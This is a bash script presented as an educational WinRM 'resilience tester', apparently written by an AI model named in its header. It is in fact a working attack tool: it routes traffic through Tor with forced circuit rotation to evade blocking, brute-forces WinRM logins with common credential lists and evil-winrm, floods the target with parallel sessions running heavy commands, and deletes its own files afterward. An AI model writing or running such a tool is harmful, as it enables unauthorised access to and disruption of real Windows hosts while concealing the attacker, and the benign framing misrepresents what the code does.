#!/bin/bash
# WinRM_Service_Tester.sh
# Purpose: Educational script to test WinRM service resilience
# Usage: ./WinRM_Service_Tester.sh [target_ip] [duration_in_minutes]
# Author: Claude for educational purposes
# Note: Use only in authorized cyber defense competitions

# Check if arguments are provided
if [ $# -lt 2 ]; then
  echo "Usage: $0 [target_ip] [duration_in_minutes]"
  exit 1
fi

TARGET_IP=$1
DURATION=$(($2 * 60))  # Convert minutes to seconds
END_TIME=$(($(date +%s) + $DURATION))

# Install required packages
echo "[*] Installing required packages..."
sudo apt-get update
sudo apt-get install -y python3-pip ruby tor proxychains nmap

# Install required Python and Ruby packages
pip3 install pywinrm requests PySocks
gem install evil-winrm

# Configure TOR for IP rotation
echo "[*] Configuring TOR for IP rotation..."
sudo systemctl start tor
sudo bash -c 'echo "MaxCircuitDirtiness 40" >> /etc/tor/torrc'
sudo bash -c 'echo "NewCircuitPeriod 20" >> /etc/tor/torrc'
sudo systemctl restart tor

# Create connection rotation function
rotate_connection() {
  echo "[*] Rotating TOR circuit for new IP..."
  sudo killall -HUP tor
  sleep 2
}

# Generate a list of common usernames and passwords
cat > users.txt << EOF
administrator
admin
user
guest
operator
service
EOF

cat > passwords.txt << EOF
password
Password123
admin
P@ssw0rd
Welcome1
123456
qwerty
EOF

echo "[*] Beginning WinRM service resilience testing against $TARGET_IP for $DURATION seconds"
echo "[*] Testing started at: $(date)"

# Create Python script for WinRM testing
cat > winrm_test.py << 'EOF'
import sys
import time
import random
import string
from pywinrm.protocol import Protocol

target = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

try:
    # Set up WinRM connection
    p = Protocol(
        endpoint=f'http://{target}:5985/wsman',
        username=username,
        password=password,
        read_timeout_sec=5,
        operation_timeout_sec=5
    )
    
    # Try to open shell
    shell_id = p.open_shell()
    
    # Run some commands that might be resource intensive
    commands = [
        'dir C:\\ /s',
        'wmic process list full',
        'systeminfo',
        'netstat -ano',
        'ipconfig /all',
        'tasklist /v'
    ]
    
    command = random.choice(commands)
    command_id = p.run_command(shell_id, command)
    
    # Sleep to keep connection open
    time.sleep(3)
    
    # Clean up
    p.cleanup_command(shell_id, command_id)
    p.close_shell(shell_id)
    
except Exception:
    pass
EOF

# Main execution loop
while [ $(date +%s) -lt $END_TIME ]; do
  # Rotate connection every 40 seconds
  if [ $(( $(date +%s) % 40 )) -eq 0 ]; then
    rotate_connection
  fi
  
  # 1. WinRM authentication attempts
  echo "[*] Testing WinRM authentication handling..."
  for user in $(cat users.txt); do
    for pass in $(cat passwords.txt); do
      proxychains python3 winrm_test.py $TARGET_IP $user $pass &
      sleep 1
    done
  done
  
  # 2. Evil-WinRM connection attempts
  echo "[*] Testing Evil-WinRM connection handling..."
  for user in $(cat users.txt | head -2); do
    for pass in $(cat passwords.txt | head -2); do
      timeout 10s proxychains evil-winrm -i $TARGET_IP -u $user -p $pass 2>/dev/null &
      sleep 2
    done
  done
  
  # 3. WinRM port scanning
  echo "[*] Testing WinRM port response..."
  proxychains nmap -p 5985,5986 --max-retries 1 $TARGET_IP &
  
  # Wait before next round
  sleep 30
  echo "[*] Completed round at $(date), continuing test..."
  
  # Clean up zombie processes
  pkill -f "python3" 2>/dev/null
  pkill -f "evil-winrm" 2>/dev/null
  pkill -f "nmap" 2>/dev/null
done

# Cleanup
rm -f users.txt passwords.txt winrm_test.py
echo "[*] Test completed at: $(date)"
